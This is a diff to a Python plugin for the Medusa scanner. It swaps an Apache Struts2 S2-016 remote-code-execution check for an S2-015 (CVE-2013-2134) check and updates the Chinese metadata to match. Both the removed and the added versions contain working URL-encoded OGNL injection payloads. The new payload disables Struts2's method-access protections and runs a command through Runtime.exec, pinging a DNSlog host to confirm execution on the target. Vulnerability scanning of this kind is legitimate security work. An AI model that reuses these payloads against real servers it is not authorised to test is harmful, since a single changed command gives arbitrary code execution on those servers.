@@ -10,17 +10,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
         self.info = {}
-        self.info['number']="CVE-2013-2251" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
+        self.info['number']="CVE-2013-2134" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
         self.info['author'] = "Ascotbe"  # 插件作者
         self.info['create_date']  = "2020-3-14"  # 插件编辑时间
-        self.info['disclosure']='2013-7-9'#漏洞披露时间，如果不知道就写编写插件的时间
-        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability16"  # 插件名称
-        self.info['name'] ='Struts2远程代码执行漏洞16' #漏洞名称
+        self.info['disclosure']='2013-6-5'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability15"  # 插件名称
+        self.info['name'] ='Struts2远程代码执行漏洞15' #漏洞名称
         self.info['affects'] = "Struts2"  # 漏洞组件
-        self.info['desc_content'] = "DefaultActionMapper类支持以action:，redirect:和redirectAction:作为访问前缀，前缀后面可以跟OGNL表达式，由于Struts2未对其进行过滤，导致任意Action可以使用这些前缀执行任意OGNL表达式，从而导致任意命令执行，经测试发现redirect:和redirectAction:这两个前缀比较好容易构造出命令执行的"  # 漏洞描述
+        self.info['desc_content'] = "漏洞产生于配置了Action通配符*，并将其作为动态值时，解析时会将其内容执行OGNL表达式"  # 漏洞描述
         self.info['rank'] = "高危"  # 漏洞等级
-        self.info['suggest'] = "删除“action:”，”redirect:”，”redirectAction:”这些前置前缀调用"  # 修复建议
-        self.info['version'] = "Struts2.0.0-Struts2.3.15"  # 这边填漏洞影响的版本
+        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
+        self.info['version'] = "Struts2.0.0-Struts2.3.14.2"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
 class UrlProcessing:  # URL处理函数
@@ -43,7 +43,7 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         port = port
     DL=Dnslog()
     con=""
-    payload="""?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27ping%27%2c%27{}%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D""".format(DL.dns_host())
+    payload="""%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20{}%27%29.getInputStream%28%29%29%2C%23q%7D.action""".format(DL.dns_host())
     try:
         payload_url = scheme + "://" + url +":"+ str(port)+path+payload
         headers = {
@@ -60,7 +60,7 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
 
         time.sleep(2)
         if DL.result():
-            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-016)\r\n漏洞详情:\r\n版本号:S2-016\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
+            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-015)\r\n漏洞详情:\r\n版本号:S2-015\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
             _t=VulnerabilityInfo(Medusa)
             VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
